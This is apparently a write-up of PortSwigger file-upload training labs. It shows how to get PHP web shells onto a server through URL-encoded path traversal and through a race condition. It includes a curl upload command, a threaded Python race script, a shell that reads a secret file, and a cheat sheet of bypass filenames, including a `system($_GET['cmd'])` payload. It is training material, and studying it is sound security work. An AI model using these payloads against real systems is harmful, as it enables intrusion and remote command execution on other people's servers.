# PortSwigger File Upload Labs — Web Shell Upload Techniques

## Lab 1: Web shell upload via path traversal
**Goal:** Upload PHP shell outside upload directory via `../` in filename  
**Bypass:** The server strips `../` but NOT URL-encoded `..%2f`  
**Solution:** `filename="..%2fshell.php"` → file saved as `avatars/../shell.php` which resolves to `files/shell.php`

```bash
# Create PHP shell
echo '<?php echo file_get_contents("/home/carlos/secret"); ?>' > shell.php

# Upload with URL-encoded path traversal
curl -X POST "https://target.com/my-account/avatar" \
  -F 'avatar=@shell.php;filename=..%2fshell.php' \
  -F 'user=wiener'

# Access shell at files/shell.php (resolved path)
curl "https://target.com/files/shell.php"
```

## Lab 2: Web shell upload via race condition
**Goal:** Access PHP shell before validation deletes it  
**Technique:** Upload PHP file + simultaneously access it via repeated GETs

```python
# Upload and race-condition access
import requests, threading

def upload():
    requests.post("https://target.com/my-account/avatar",
        files={"avatar": ("shell.php", PAYLOAD, "image/jpeg")})

def access():
    while True:
        r = requests.get("https://target.com/files/avatars/shell.php")
        if r.status_code == 200 and "<?php" not in r.text:
            print(f"SUCCESS: {r.text}")
            break

threads = [threading.Thread(target=upload) for _ in range(10)]
threads += [threading.Thread(target=access) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

## Key Bypass Techniques
| Technique | Example |
|-----------|---------|
| URL-encoded path traversal | `filename="..%2f..%2f..%2fvar/www/html/shell.php"` |
| Double URL encoding | `filename="..%252f..%252fshell.php"` |
| UTF-8 path traversal | `filename="..%c0%afshell.php"` |
| Race condition | Upload + simultaneous GET before validation |
| Content-type bypass | `Content-Type: image/gif` |
| Magic byte prefix | `GIF89a<?php system($_GET['cmd']); ?>` |
|null byte truncation | `filename="shell.php%00.jpg"` |
| Double extension | `filename="shell.php.jpg"` (some servers check last/ext first) |
